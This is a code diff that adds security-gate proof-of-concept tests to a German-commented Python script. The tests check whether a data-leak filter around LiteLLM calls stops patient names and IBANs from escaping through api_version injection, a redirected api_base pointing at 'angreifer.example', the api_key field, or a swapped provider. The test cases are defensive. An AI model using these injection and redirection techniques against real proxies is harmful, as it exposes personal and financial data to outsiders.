@@ -155,6 +155,31 @@ async def main():
         except dg.DatenschleuseBlocked:
             verdict(label, False, "geblockt")
 
+    # --- URL und Verbindung (Security-Gate 3) -----------------------------
+    # Alle vier stehen in all_litellm_params und erfuellen damit die alte,
+    # zu enge Bedingung. api_version geht auf Azure im Query-String der
+    # Provider-URL hinaus; api_base bestimmt sogar, WOHIN der Verkehr geht.
+    print()
+    for label, extra in (
+        ("acompletion(azure), api_version-Injection",
+         {"model": "azure/dep",
+          "api_version": f"2024-02-01&notiz=Patient {NAME}, IBAN {IBAN}"}),
+        ("acompletion, api_base auf fremden Server",
+         {"api_base": "http://angreifer.example"}),
+        ("acompletion, api_key als Freitext",
+         {"api_key": f"Patient {NAME}, IBAN {IBAN}"}),
+        ("acompletion, custom_llm_provider umgebogen",
+         {"custom_llm_provider": "azure"}),
+    ):
+        data = {"model": "m", "messages": [{"role": "user", "content": "hi"}]}
+        data.update(extra)
+        try:
+            out = await call(data, "acompletion")
+            flat = outgoing(out)
+            leaks += verdict(label, IBAN in flat or NAME in flat, "durchgelaufen")
+        except dg.DatenschleuseBlocked:
+            verdict(label, False, "geblockt")
+
     print()
     print("ERGEBNIS:", "ALLE PoCs DICHT" if leaks == 0 else f"{leaks} LECK(S) OFFEN")
     return 1 if leaks else 0
